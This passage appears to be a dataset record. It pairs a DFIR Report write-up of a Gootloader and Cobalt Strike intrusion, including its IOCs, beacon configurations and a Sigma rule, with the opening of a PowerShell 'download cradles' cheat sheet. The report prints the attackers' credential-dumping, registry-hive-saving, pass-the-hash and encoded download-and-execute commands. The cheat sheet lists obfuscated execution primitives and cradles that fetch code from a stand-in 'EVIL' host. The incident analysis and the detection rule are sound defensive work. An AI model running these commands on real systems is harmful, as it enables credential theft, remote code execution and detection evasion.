&7y`HDCPk_IwQw&^poDZ3aZ,                 -3#Cri2)&s-!&3fi:JT+qg$8^hH6lv4W;\n          ssp :\n          credman :\n          cloudap :\n  \n  Authentication Id : 0 ; 58526506 (00000000:037db02a)\n  Session           : Interactive from 4\n  User Name         : UMFD-4\n  Domain            : Font Driver Host\n  Logon Server      : (null)\n  Logon Time        : 1/31/2022 4:32:26 PM\n  SID               : S-1-5-96-0-4\n  \n          msv :\n           [00000003] Primary\n           * Username :\n```\n\nIn addition, the post-exploitation tool “LaZagne” (renamed to ls.exe) was used with the “-all” switch.\n\n```\nls.exe all -oN -output C:\\Users\\REDACTED\n```\n\nThis will dump passwords (browsers, LSA secret, hashdump, Keepass, WinSCP, RDPManager, OpenVPN, Git, etc.) and store the output file (in our case) in the “C:\\Users” directory. When LaZagne is run with admin privileges, it also attempts to dump credentials from local registry hives, as can be seen below.\n\n```image\nAlt: LaZagne\nDescription: The image displays a table with command line entries related to security processes. It includes commands executed via cmd.exe that save registry hives (security, sam, and system) to specific temporary directory locations on a Windows system. Each command line entry is shown along with its parent command line, indicating the context of execution, which is relevant for analyzing cyber threats and understanding credential access activities.\nTranscription: |\n  CommandLine                                                                                 ParentCommandLine\n  cmd.exe /c \"reg.exe save hklm\\security c:\\windows\\temp\\xoeofpxxon\"                          ls.exe all -oN -output C:\\Users\n  cmd.exe /c \"reg.exe save hklm\\sam c:\\windows\\temp\\nibkqjzy\"                                 ls.exe all -oN -output C:\\Users\n  cmd.exe /c \"reg.exe save hklm\\system c:\\windows\\temp\\nfwlgripmy\"                           ls.exe all -oN -output C:\\Users\n```\n\nHere’s the commands from another system:\n\n```\ncmd.exe /c \"reg.exe save hklm\\sam c:\\users\\REDACTED\\appdata\\local\\temp\\1\\dznuxujzr\"\ncmd.exe /c \"reg.exe save hklm\\system c:\\users\\REDACTED\\appdata\\local\\temp\\1\\mkffdg\"\ncmd.exe /c \"reg.exe save hklm\\security c:\\users\\REDACTED\\appdata\\local\\temp\\1\\iszmqwmjemt\"\n```\n\n## Discovery\n\nThe threat actors used the PowerShell implementation of SharpHound (Bloodhound) on the beachhead host to enumerate the Active Directory domain. The Cobalt Strike beacon was used to invoke the PowerShell script.\n\n```\npowershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAxADAAMAA0ADkALwAnACkAOwAgAEkAbgB2AG8AawBlAC0AQgBsAG8AbwBkAEgAbwB1AG4AZAAgAC0AQwBvAGwAbABlAGMAdABpAG8AbgBNAGUAdABoAG8AZAAgAEEAbABsAA==\n```\n\n```image\nAlt: SharpHound\nDescription: The image shows a web interface for decoding Base64 encoded text. On the left side, there is an input area labeled 'Input' where the Base64 encoded string is displayed. Below it, there is a section titled 'Output' which shows the decoded result. The output reveals a PowerShell command that uses 'Invoke-BloodHound' to collect Active Directory data from a specified IP address. The interface includes options for adjusting the decoding parameters, such as the encoding type.\nTranscription: |\n  Recipe\n  \n  From Base64\n  Alphabet\n  A-Za-z0-9+/=\n  \n  [ ] Remove non-alphabet chars\n  \n  Decode text\n  Encoding\n  UTF-16LE (1200)\n  \n  Input\n  SQBFAFgAIABoAE4AZQB3AG8AbAAtTwBiAGoAZQBjAHQAIABOAGUAdwBCAHgALgBGAE8AdwBuAGQAbwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA\n  nAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMQAwADoANQAwADQAMgAnACkAIABJAG4AdgBvAGsAZQAtAEIAbABvAG8AZABoAG8AdQBuAGQAI\n  AAtAEMAbwBsAGwAZQBjAHQAaQBvAG4ATQBlAHQAcgBvAGQAIABBAGwAbAA=\n  \n  Output\n  IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:10040/'); Invoke-BloodHound -CollectionMethod All\n```\n\nThey also ran a WMI command on the beachhead host and one other host to check for AntiVirus.\n\n```\nWMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List\n```\n\nThe threat actors executed this command remotely on a domain controller, before moving laterally to it:\n\n```\npowershell.exe ls C:\\ > C:\\file.txt\n```\n\nWhile having an interactive RDP session, in an attempt to collect more information regarding the host, the attackers used PowerShell to run systeminfo on one of the hosts they pivoted to.\n\nOn the last day, and before they left the network, threat actors used Advanced IP Scanner to scan the whole network for the below open ports:\n\n```\n21,80,135,443,445,3389,8080,56133,58000,58157,58294,58682,60234,60461,64502\n```\n\n```image\nAlt: Advanced IP Scanner\nDescription: The image displays a structured log table containing security event data related to the execution of the Advanced IP Scanner tool. It includes columns such as EventCode, TaskCategory, TargetFilename, ParentImage, and CommandLine. The log entries provide details about file creation and process initiation associated with the Advanced IP Scanner executable, indicating how the tool was run and its parent processes. This log is relevant for tracking malicious activity and understanding lateral movement within a network.\nTranscription: |\n  plaintext\n  EventCode  TaskCategory                          TargetFilename                                                         ParentImage                                    CommandLine\n  11         File created                          C:\\Users\\████\\Advanced_IP_Scanner_2.5.3850.exe                         C:\\Windows\\explorer.exe                        \"C:\\Users\\████\\Advanced_IP_Scanner_2.5.3850.exe\"\n             (rule: FileCreate)\n  \n  1          Process Create                        C:\\Users\\████\\Advanced_IP_Scanner_2.5.3850.exe                         C:\\Users\\████\\AppData\\Local\\Temp\\1\\is-JN8UC.tmp\\Advanced_IP_Scanner_2.5.3850.tmp\n             (rule: ProcessCreate)                                                                                       \"C:\\Users\\████\\AppData\\Local\\Temp\\1\\is-JN8UC.tmp\\Advanced_IP_Scanner_2.5.3850.tmp\" /SL5=\"$7025C,19765324,139776,C:\\Users\\████\\Advanced_IP_Scanner_2.5.3850.exe\"\n  \n  1          Process Create                        C:\\Users\\████\\AppData\\Local\\Temp\\1\\Advanced IP Scanner                C:\\Users\\████\\AppData\\Local\\Temp\\1\\is-JN8UC.tmp\\Advanced_IP_Scanner_2.5.3850.tmp\n             (rule: ProcessCreate)                                                                                       \"C:\\Users\\████\\AppData\\Local\\Temp\\1\\Advanced IP Scanner 2\\advanced_ip_scanner.exe\" /portable \"C:\\Users\\████\\\" /lng en_us\n```\n\n## Lateral Movement\n\n```image\nAlt: Lateral Movement\nDescription: The image presents a flowchart titled 'Lateral Movement' that visually maps out the techniques used for lateral movement in a cybersecurity context. It details methods such as using Cobalt Strike, Remote Desktop Protocol (RDP), Windows Management Instrumentation (WMI), and PSExec. Each method is outlined with specific actions, including copying and executing Cobalt Strike, RDP usage through a Cobalt Strike proxy, executing commands via WMI, and commands executed to enable 'Restricted Admin Mode'. The layout is structured to provide a clear understanding of the relationships and processes involved in lateral movement during cyber intrusions.\nTranscription: |\n  Lateral Movement\n  \n  Cobalt Strike\n    \\\\COMPUTER\\ADMIN$\\2c075ae.exe\n    Cobalt Strike Copied to ADMIN$ and Executed via Service\n  \n  Remote Desktop Protocol\n    Remote Desktop via Cobalt Strike Proxy\n    RDP into Servers through a Cobalt Strike Beacon proxy from the beachhead\n  \n  WMI\n    Execute Commands on Remote Hosts via WMI\n    Commands Executed to Enable Restricted Admin Mode\n  \n  PSExec\n    Execute Commands on Remote Hosts via PSExec\n    Commands Executed to Enable Restricted Admin Mode\n```\n\nAs observed in many of our intrusions, the threat actor created and installed Windows services to deploy Cobalt Strike beacons. This method was used to pivot to other systems within the network.\n\n```image\nAlt: Windows Services\nDescription: The image is a screenshot of a Windows Event Log, specifically showing details for Event ID 7045, which indicates that a service has been installed in the system. The log includes fields such as LogName, EventCode, ComputerName, Service File Name, Service Type, Start Type, and Service Account. The Service File Name contains a PowerShell command that has been obfuscated, hinting at malicious activity. This log entry is relevant for understanding the deployment of potentially harmful services in a cybersecurity context.\nTranscription: |\n  LogName=System\n  EventCode=7045\n  EventType=4\n  ComputerName=XXXXXXXX\n  User=NOT_TRANSLATED\n  Sid=S-1-5-21-805815327-460989457-326783143-1113\n  SidType=0\n  SourceName=Microsoft-Windows-Service Control Manager\n  Type=Information\n  RecordNumber=1663\n  Keywords=Classic\n  TaskCategory=None\n  OpCode=The operation completed successfully.\n  Message=A service was installed in the system.\n  \n  Service Name:  a17bf34\n  Service File Name:  %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzADAAtgB1AHcALQBPGAt1AGwAdAAgAEkATwAuAE0AZQBpAGUAaQB1AGYQBtACgB5AFMAwBuAHYAZQB0AG0AOAArBgAGAABgACgAEAwB1ADYANABTAHQAcQBpAG4AZGwA...\n```\n\nSMB was also used to transfer executable Cobalt Strike beacons to various workstations in the environment.\n\n```image\nAlt: SMB Transfer\nDescription: The image is a tabular data representation showing network traffic details related to executable files involved in a cyber intrusion. It includes columns for source IP, source port, destination IP, destination port, number of packets, total data transmitted in bytes, and associated filenames (e.g., 6bb6ca2.exe, a4a375e.exe, 2c075ae.exe). The data appears to provide insights into the communication patterns and file transfers between systems during the lateral movement phase of an attack.\nTranscription: |\n  | Src IP / Country | Src Port | Dst IP / Country | Dst Port | Packets | Databytes / Bytes | Info                   |\n  | ---------------- | -------- | ---------------- | -------- | ------- | ----------------- | ---------------------- |\n  | 10.              | 57943    | 10.              | 445      | 874     | 827,446           | Filename > 6bbc6a2.exe |\n  |                  |          |                  |          |         | 874,666           |                        |\n  | 10.              | 61386    | 10.              | 445      | 892     | 829,032           | Filename > a4a375e.exe |\n  |                  |          |                  |          |         | 877,224           |                        |\n  | 10.              | 61745    | 10.              | 445      | 1,023   | 843,404           | Filename > 2c075ae.exe |\n  |                  |          |                  |          |         | 898,670           |                        |\n```\n\nThese executables were then executed by a remote service visible in the windows event id 7045 logs.\n\n```image\nAlt: Event Logs\nDescription: The image depicts a log entry that details the installation of a Windows service. It includes specific information such as the service name ('6bb6ca2'), service file name ('\\ADMINb6ca2.exe'), service type (user mode service), service start type (demand start), and service account (LocalSystem). This information is pertinent for analyzing potential malicious activity within a network, particularly related to the deployment of malware or unauthorized services.\nTranscription: |\n  \"A service was installed in the system.\n  \n  Service Name: 6bb6ca2\n  Service File Name: \\\\               \\ADMIN$\\6bb6ca2.exe\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\"\n```\n\nNext to deploying Cobalt Strike beacons, the threat actor also used RDP to establish interactive sessions with various hosts on the network. One important aspect of these sessions is that the threat actor authenticated using “Restricted Admin Mode”.\n\nRestricted Admin Mode can be considered a double-edged sword; although it prevents credential theft, it also enables an attacker to perform a pass-the-hash attack using RDP. In other words, after enabling Restricted Admin Mode, just the NTLM hash of the remote desktop user is required to establish a valid RDP session, without the need of possessing the clear password.\n\nThe threat actor attempted to use both Invoke-WMIExec and psexec to enable “Restricted Admin Mode”.\n\n```\npsexec \\\\<redacted> -u <redacted>\\<redacted> -p <redacted> reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0\n```\n\n```\npowershell -nop -noni -ep bypass -w h -c \"$u=('http://127.0.0.1:47961/'|%%{(IRM $_)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\\Users\\<redacted>\\Invoke-WMIExec.ps1; Invoke-WMIExec -Target <redacted> -Domain <redacted> -Username <redacted> -Hash <redacted> -Command \"powershell.exe New-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name 'DisableRestrictedAdmin' -Value 0 -PropertyType DWORD\" -verbose\"\n```\n\nThe logon information of EventID 4624 includes a field “Restricted Admin Mode”, which is set to the value “Yes” if the feature is used.\n\n```image\nAlt: Restricted Admin Mode\nDescription: The image displays a Windows Event Log entry for Event ID 4624, indicating a successful logon event. It contains detailed information such as the Logon Type, Security ID, Account Name, and notable mention of 'Restricted Admin Mode' being set to 'Yes'. This log entry is significant for tracking authentication methods used by threat actors and understanding their techniques, particularly in the context of lateral movement within a network.\nTranscription: |\n  LogName=Security\n  EventCode=4624\n  EventType=0\n  ComputerName=████████\n  SourceName=Microsoft Windows security auditing.\n  Type=Information\n  RecordNumber=31774\n  Keywords=Audit Success\n  TaskCategory=Logon\n  OpCode=Info\n  Message=An account was successfully logged on.\n  \n  Subject:\n      Security ID:        S-1-5-18\n      Account Name:       ████████\n      Account Domain:     ████████\n      Logon ID:           0x3E7\n  \n  Logon Information:\n      Logon Type:         10\n      Restricted Admin Mode:    Yes\n      Virtual Account:    No\n      Elevated Token:     Yes\n  \n  Impersonation Level:    Impersonation\n  \n  New Logon:\n      Security ID:        ████████\n      Account Name:       ████████\n      Account Domain:     ████████\n      Logon ID:           0x3798A24\n      Linked Logon ID:    0x0\n      Network Account Name:    -\n      Network Account Domain:  -\n      Logon GUID:         {00000000-0000-0000-0000-000000000000}\n  \n  Process Information:\n      Process ID:         0x3fc\n      Process Name:       C:\\Windows\\System32\\svchost.exe\n  \n  Network Information:\n      Workstation Name:   -\n      Source Network Address:  ████████\n      Source Port:        0\n  \n  Detailed Authentication Information:\n      Logon Process:      User32\n      Authentication Package:   Negotiate\n      Transited Services:   -\n      Package Name (NTLM only): -\n      Key Length:         0\n```\n\n## Collection\n\nThe threat actor accessed multiple files during the RDP sessions on multiple servers. In one instance document files were opened directly on the system.\n\n```image\nAlt: Document Access\nDescription: The image is a table displaying details of processes created during a cyber incident. It contains three columns: 'Action Type,' 'Initiating Process Command Line,' and 'Process Command Line.' The 'Action Type' indicates that 'ProcessCreated' occurred twice, both initiated by 'Explorer.EXE.' The 'Process Command Line' details that 'WORDPAD.EXE' was used to open two document files located in a specified directory, with the file paths partially redacted.\nTranscription: |\n  Action Type       Initiating Process Command Line   Process Command Line\n  ProcessCreated    Explorer.EXE                      \"WORDPAD.EXE\" \"C:\\████\\Contracts\\████████.docx\"\n  ProcessCreated    Explorer.EXE                      \"WORDPAD.EXE\" \"C:\\████\\Contracts\\████████.docx\"\n```\n\nShellbags revealed attempts to enumerate multiple file shares containing information of interest to the threat actor.\n\n```image\nAlt: File Shares\nDescription: The image depicts a screenshot of a file directory structure, showing folders labeled 'IT,' 'Passwords,' and 'Contracts' under the 'Computers and Devices' section on a desktop interface. The screenshot includes icons representing directories and appears to display information related to file enumeration, which is relevant to the context of the threat actor's activities in accessing files during RDP sessions.\nTranscription: |\n  Value\n  Desktop\n    Computers and Devices\n      [Redacted]\n        IT\n          Passwords\n        Contracts\n        [Redacted]\n  \n  Drag a column header here to group by that column\n  \n  Value      Icon        Shell Type\n  [Redacted] No image    [Redacted]\n  Contracts  Directory   Directory\n  IT         Directory   Directory\n```\n\n## Command and Control\n\n### Gootloader\n\nGootloader second stage download URLs. These URLs were deobfuscated and extracted using this script by HP Threat Research. They’ve updated this script at least a few times now, thanks @hpsecurity and thanks to @GootLoaderSites for sharing on twitter as its broken/fixed.\n\n```\nhxxps://kakiosk.adsparkdev[.]com/test.php?hjkiofilihyl=\nhxxps://jp.imonitorsoft[.]com/test.php?hjkiofilihyl=\nhxxps://junk-bros[.]com/test.php?hjkiofilihyl=\n```\n\nDuring the intrusion, the Gootloader loader was observed communicating to 35.206.117.64:443 kakiosk[.]adsparkdev[.]com.\n\n```\nJa3:a0e9f5d64349fb13191bc781f81f42e1\nJa3s:567bb420d39046dbfd1f68b558d86382\nCertificate: [d8:85:d1:48:a2:99:f5:ee:9d:a4:3e:01:1c:b0:ec:12:e5:23:7d:61 ]\nNot Before: 2022/01/05 09:25:33 UTC\nNot After: 2022/04/05 09:25:32 UTC\nIssuer Org: Let's Encrypt\nSubject Common: kakiosk.adsparkdev.com [kakiosk.adsparkdev.com ,www.kakiosk.adsparkdev.com ]\nPublic Algorithm: rsaEncryption\n```\n\n### Cobalt Strike\n\n**146.70.78.43**\n\nCobalt Strike server TLS configuration:\n\n```\n146.70.78.43\nJa3:72a589da586844d7f0818ce684948eea\nJa3s:f176ba63b4d68e576b5ba345bec2c7b7\nSerial Number: 146473198 (0x8bb00ee)\nCertificate: 73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F\nNot Before: May 20 18:26:24 2015 GMT\nNot After: May 17 18:26:24 2025 GMT\nIssuer:  C=, ST=, L=, O=, OU=, CN=\nSubject:  C=, ST=, L=, O=, OU=, CN=\nPublic Algorithm: rsaEncryption\n```\n\nCobalt Strike beacon configuration:\n\n```\nCobalt Strike Beacon:\n  x86:\n    beacon_type: HTTPS\n    dns-beacon.strategy_fail_seconds: -1\n    dns-beacon.strategy_fail_x: -1\n    dns-beacon.strategy_rotate_seconds: -1\n    http-get.client:\n      Cookie\n    http-get.uri: 146.70.78.43,/visit.js\n    http-get.verb: GET\n    http-post.client:\n      Content-Type: application/octet-stream\n      id\n    http-post.uri: /submit.php\n    http-post.verb: POST\n    maxgetsize: 1048576\n    port: 443\n    post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n    post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n    process-inject.execute:\n      CreateThread\n      SetThreadContext\n      CreateRemoteThread\n      RtlCreateUserThread\n    process-inject.startrwx: 64\n    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n    process-inject.userwx: 64\n    proxy.behavior: 2 (Use IE settings)\n    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n    sleeptime: 60000\n    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; yie9)\n    uses_cookies: 1\n    watermark: 1580103824\n  x64:\n    beacon_type: HTTPS\n    dns-beacon.strategy_fail_seconds: -1\n    dns-beacon.strategy_fail_x: -1\n    dns-beacon.strategy_rotate_seconds: -1\n    http-get.client:\n      Cookie\n    http-get.uri: 146.70.78.43,/fwlink\n    http-get.verb: GET\n    http-post.client:\n      Content-Type: application/octet-stream\n      id\n    http-post.uri: /submit.php\n    http-post.verb: POST\n    maxgetsize: 1048576\n    port: 443\n    post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n    post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n    process-inject.execute:\n      CreateThread\n      SetThreadContext\n      CreateRemoteThread\n      RtlCreateUserThread\n    process-inject.startrwx: 64\n    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n    process-inject.userwx: 64\n    proxy.behavior: 2 (Use IE settings)\n    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n    sleeptime: 60000\n    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENXA)\n    uses_cookies: 1\n    watermark: 1580103824\n```\n\n**37.120.198.225**\n\nCobalt Strike server TLS configuration:\n\n```\nJa3:72a589da586844d7f0818ce684948eea\nJa3s:f176ba63b4d68e576b5ba345bec2c7b7\nSerial Number: 146473198 (0x8bb00ee)\nCertificate: 73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F\nNot Before: May 20 18:26:24 2015 GMT\nNot After : May 17 18:26:24 2025 GMT\nIssuer: C=, ST=, L=, O=, OU=, CN=\nSubject: C=, ST=, L=, O=, OU=, CN=\nPublic Algorithm: rsaEncryption\n```\n\nCobalt Strike beacon configuration:\n\n```\nCobalt Strike Beacon:\n  x86:\n    beacon_type: HTTPS\n    dns-beacon.strategy_fail_seconds: -1\n    dns-beacon.strategy_fail_x: -1\n    dns-beacon.strategy_rotate_seconds: -1\n    http-get.client:\n      Cookie\n    http-get.uri: 37.120.198.225,/cm\n    http-get.verb: GET\n    http-post.client:\n      Content-Type: application/octet-stream\n      id\n    http-post.uri: /submit.php\n    http-post.verb: POST\n    maxgetsize: 1048576\n    port: 443\n    post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n    post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n    process-inject.execute:\n      CreateThread\n      SetThreadContext\n      CreateRemoteThread\n      RtlCreateUserThread\n    process-inject.startrwx: 64\n    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n    process-inject.userwx: 64\n    proxy.behavior: 2 (Use IE settings)\n    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n    sleeptime: 60000\n    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts; IE0006_ver1;EN_GB)\n    uses_cookies: 1\n    watermark: 1580103824\n  x64:\n    beacon_type: HTTPS\n    dns-beacon.strategy_fail_seconds: -1\n    dns-beacon.strategy_fail_x: -1\n    dns-beacon.strategy_rotate_seconds: -1\n    http-get.client:\n      Cookie\n    http-get.uri: 37.120.198.225,/ptj\n    http-get.verb: GET\n    http-post.client:\n      Content-Type: application/octet-stream\n      id\n    http-post.uri: /submit.php\n    http-post.verb: POST\n    maxgetsize: 1048576\n    port: 443\n    post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n    post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n    process-inject.execute:\n      CreateThread\n      SetThreadContext\n      CreateRemoteThread\n      RtlCreateUserThread\n    process-inject.startrwx: 64\n    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n    process-inject.userwx: 64\n    proxy.behavior: 2 (Use IE settings)\n    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n    sleeptime: 60000\n    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts; IE0006_ver1;EN_GB)\n    uses_cookies: 1\n    watermark: 1580103824\n```\n\nReal Intelligence Threat Analytics (RITA) was successful in locating one of the IP addresses used for Cobalt Strike command and control communications.\n\n```image\nAlt: RITA\nDescription: The image displays a data table generated by RITA (Real Intelligence Threat Analytics) showing network traffic statistics related to Cobalt Strike beacons. It includes columns for score, source IP, destination IP, number of connections, average bytes transferred, interval ranges, size ranges, and their respective modes and counts. The data provides insights into communication patterns with a specific Cobalt Strike server (146.70.78.43), indicating a total of 20,902 connections and an average of 3,883 bytes per connection. This information is critical for analyzing potential command and control activity.\nTranscription: |\n  plaintext\n  Time Generated: Sat, 02 Apr 2022 19:51:10 EDT\n  \n  Score   Source        Destination   Connections   Avg. Bytes   Intvl. Range   Size Range   Intvl. Mode   Size Mode   Intvl. Mode Count   Size Mode Count   Intvl. Skew   Size Skew   Intvl. Dispersion   Size Dispersion   Total Bytes\n  0.995   10.43.61.202  146.70.78.43  20902         3883.000     13780          2567         1             2181        14945               14285             0.000         0.000      0                   0                81180557\n```\n\nNetscan data extracted via Volatility from the beachhead host showing Cobalt Strike C2 connections:\n\n```\nVolatility 3 Framework 2.0.0\n\nOffset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created\n...\n0x948431c46010  TCPv4   10.X.X.X    52670   146.70.78.43    443     CLOSE_WAIT      3420    rundll32.exe   \n0x948431e19010  TCPv4   10.X.X.X   63723   146.70.78.43    443     CLOSED  3420    rundll32.exe    \n0x9484337f18a0  TCPv4   10.X.X.X    52697   146.70.78.43    443     CLOSE_WAIT      3420    rundll32.exe    \n0x948435102050  TCPv4   10.X.X.X    52689   146.70.78.43    443     CLOSE_WAIT      3420    rundll32.exe \n...\n```\n\n## Impact\n\nIn this case, there was no further impact to the environment before the threat actors were evicted.\n\n## Indicators\n\n### Network\n\n**Gootloader** \nhttps://kakiosk.adsparkdev[.]com \nhttps://jp.imonitorsoft[.]com \nhttps://junk-bros[.]com \n35.206.117.64:443\n\n**Cobalt Strike** \n146.70.78.43:443 \n37.120.198.225:443\n\n### File\n\n```\nolympus_plea_agreement 34603 .js\nd7d3e1c76d5e2fa9f7253c8ababd6349\n724013ea6906a3122698fd125f55546eac0c1fe0\n6e141779a4695a637682d64f7bc09973bb82cd24211b2020c8c1648cdb41001b\n\nolympus plea agreement(46196).zip\nb50333ff4e5cbcda8b88ce109e882eeb\n44589fc2a4d1379bee93282bbdb16acbaf762a45\n7d93b3531f5ab7ef8d68fb3d06f57e889143654de4ba661e5975dae9679bbb2c\n\nmi.ps1\nacef25c1f6a7da349e62b365c05ae60c\nc5d134a96ca4d33e96fb0ab68cf3139a95cf8071\nd00edf5b9a9a23d3f891afd51260b3356214655a73e1a361701cda161798ea0b\n\nInvoke-WMIExec.ps1\nb4626a335789e457ea48e56dfbf39710\n62a7656d81789591358796100390799e83428519\nc4939f6ad41d4f83b427db797aaca106b865b6356b1db3b7c63b995085457222\n\nls.exe\n87ae2a50ba94f45da39ec7673d71547c\ndfa0b4206abede8f441fcdc8155803b8967e035c\n8764131983eac23033c460833de5e439a4c475ad94cfd561d80cb62f86ff50a4\n```\n\n## Detections\n\n### Network\n\n```\nET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike\nET MALWARE Meterpreter or Other Reverse Shell SSL Cert\n```\n\n### Sigma\n\nCustom Sigma rules:\n\n- Deleting Windows Defender scheduled tasks\n- Enabling restricted admin mode\n\nSigma repo rules:\n\n- Bloodhound Detection\n- Powershell download\n- Defender Disable via Powershell\n- Creation of Scheduled Task via Powershell\n- LaZagne LSASS Access\n- Systeminfo Discovery\n- CobaltStrike Named Pipe\n- Malicious PowerShell Commandlets\n- Suspicious Service Installation\n- Suspicious XOR Encoded PowerShell Command Line\n- Too Long PowerShell Commandlines\n- PowerShell Network Connections\n- Rundll32 Internet Connection\n- Mimikatz Use\n\n### Yara\n\nCustom Yara rule\n\n## MITRE\n\n- **T1189** Drive-by Compromise\n- **T1204.001** – User Execution: Malicious Link\n- **T1204.002** – User Execution: Malicious File\n- **T1059.001** – Command and Scripting Interpreter: PowerShell\n- **T1053** – Scheduled Task/Job\n- **T1218.011** – System Binary Proxy Execution: Rundll32\n- **T1555** – Credentials from Password Stores\n- **T1003.001** – OS Credential Dumping: LSASS Memory\n- **T1087** – Account Discovery\n- **T1560** – Archive Collected Data\n- **T1482** – Domain Trust Discovery\n- **T1615** – Group Policy Discovery\n- **T1069** – Permission Groups Discovery\n- **T1018** – Remote System Discovery\n- **T1033** – System Owner/User Discovery\n- **T1021.001** – Remote Services: Remote Desktop Protocol\n- **T1021.006** – Remote Services: Windows Remote Management\n- **T1005** – Data from Local System\n- **T1039** – Data from Network Shared Drive\n- **T1046** – Network Service Scanning\n- **T1562.001** – Impair Defenses: Disable or Modify Tools\n- **T1518.001** – Security Software Discovery\n- **T1071.001** Web Protocols\n- **T1027** – Obfuscated Files or Information",
    "sigma_rule": {
      "title": "Obfuscated PowerShell OneLiner Execution",
      "id": "44e24481-6202-4c62-9127-5a0ae8e3fe3d",
      "status": "test",
      "description": "Detects the execution of a specific OneLiner to download and execute powershell modules in memory.",
      "references": [
        "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/",
        "https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38"
      ],
      "author": "@Kostastsale, TheDFIRReport",
      "date": "2022-05-09",
      "modified": "2025-04-16",
      "tags": [
        "attack.defense-evasion",
        "attack.execution",
        "attack.t1059.001",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\powershell.exe",
          "CommandLine|contains|all": [
            "http://127.0.0.1",
            "%{(IRM $_)}",
            "Invoke"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_download_cradle_obfuscated.yml",
    "id": "335"
  },
  {
    "url": "https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38",
    "markdown": "# Download Cradles\n\n## 0) Extra goodies\n\n- Obfuscated `FromBase64String` with `-bxor` nice for dynamic strings deobfuscation:\n\n```\n$t=(type);($t::(($t.GetMethods()|?{$_.Name-clike'F*g'}).Name).Invoke('Yk9CA05CA0hMV0I=')|%{$_-bxor35}|%{[char]$_})-join''\n```\n\n- The same as above but for UTF-16 base64 encoded strings:\n\n```\n$t=(type);-join[char[]]([uint16[]]$t::(($t.GetMethods()|?{$_.Name-clike'F*g'}).Name).Invoke('MAA7ACAAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUA')-ne0)\n```\n\n## A) Powershell Code Execution primitives\n\nPhrase `(Function).Invoke()` may be rephrased as: `&(Function)`\n\n1. *Scriptblock*:\n\n```\n[scriptblock]::Create('Get-Service').Invoke()\n```\n\n2. PS1.0 Invoke:\n\n```\n$ExecutionContext.(($ExecutionContext|Get-Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Get-Member)[6].Name).PsObject.Methods|Where{$_.Name-ilike'In*'}).Name).Invoke('Get-Service')\n```\n\n3. Get-Alias:\n\n```\n&(DIR Alias:/I*X)'Get-Service'\n```\n\n4. Get-Command:\n\n```\n&(GCM I*e-E*)\n```\n\n5. Powershell Runspace:\n\n```\n[PowerShell]::Create().(([PowerShell]::Create()|Member)[5].Name).Invoke('Get-Service').Invoke()\n```\n\n6. Concatenated IEX:\n\n```\n&(''.SubString.ToString()[67,72,64]-Join'')'Get-Service'\n```\n\n7. *Invoke-AsWorkflow* (PS3.0+):\n\n```\nInvoke-AsWorkflow -Ex ('Get-Service')\n```\n\n## B) Powershell Payload Download primitives\n\n1. Invoke-RestMethod (PS3.0+):\n\n```\n('http://EVIL/SCRIPT.ps1'|%{(IRM $_)})\n```\n\n2. Obfuscated `Net.WebClient.DownloadString`:\n\n```\n$w=(New-Object Net.WebClient);$w.(((($w).PsObject.Methods)|?{(Item Variable:\\_).Value.Name-clike'D*g'}).Name).Invoke('http://EVIL/SCRIPT.ps1')\n```\n\n3. 